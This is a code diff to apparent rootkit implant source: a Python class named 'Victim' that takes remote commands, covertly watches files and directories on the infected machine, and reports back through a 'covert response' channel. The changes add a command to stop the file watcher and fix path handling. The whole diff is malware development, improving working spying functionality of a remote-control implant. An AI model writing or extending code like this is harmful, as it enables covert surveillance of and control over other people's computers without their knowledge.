@@ -227,6 +227,9 @@ class Victim:
         elif cmd_type == "WATCH":
             self.start_watcher(data)
             self.send_covert_response(f"Watching {data}...\n")
+
+        elif cmd_type == "STOP_WATCH":
+            self.stop_watcher()
             
         elif cmd_type == "UNINSTALL":
             self.uninstall()
@@ -420,7 +423,20 @@ class Victim:
             
             mask = pyinotify.IN_MODIFY | pyinotify.IN_CREATE | pyinotify.IN_DELETE
             
-            watch_path = os.path.dirname(path) if os.path.isfile(path) else path
+            # FIX: Properly handle relative paths
+            if os.path.isfile(path):
+                watch_path = os.path.dirname(os.path.abspath(path))
+                if not watch_path:
+                    watch_path = "."
+                print(f"[*] Watching directory {watch_path} for file {path}")
+            elif os.path.isdir(path):
+                watch_path = os.path.abspath(path)
+                print(f"[*] Watching directory {watch_path}")
+            else:
+                self.send_covert_response(f"Error: Path {path} does not exist.\n")
+                return
+            
+            # Add watch (recursive for directories)
             wm.add_watch(watch_path, mask, rec=True, auto_add=True)
             
             def watch_loop():
@@ -436,8 +452,9 @@ class Victim:
         except Exception as e:
             self.send_covert_response(f"Watch error: {e}\n")
             print(f"[!] Watch error: {e}")
+            import traceback
+            traceback.print_exc()
             self._start_watcher_polling(path)
-
     def _start_watcher_polling(self, path):
         """Fallback polling-based watcher if pyinotify unavailable."""
         def watch_loop():
@@ -460,6 +477,24 @@ class Victim:
         self.watcher_thread = threading.Thread(target=watch_loop, daemon=True)
         self.watcher_thread.start()
         print(f"[*] Watching {path} (polling fallback)")
+
+    def stop_watcher(self):
+        """Stop the file/directory watcher."""
+        try:
+            if self.watcher_observer:
+                self.watcher_observer.stop()
+                self.watcher_observer = None
+                print("[*] pyinotify observer stopped")
+            
+            if self.watcher_thread and self.watcher_thread.is_alive():
+                self.watcher_thread = None
+                print("[*] Watcher thread stopped")
+            
+            self.send_covert_response("Watcher stopped.\n")
+            print("[*] File watcher stopped")
+        except Exception as e:
+            self.send_covert_response(f"Error stopping watcher: {e}\n")
+            print(f"[!] Error stopping watcher: {e}")
 
     def uninstall(self):
         """Remove the rootkit."""
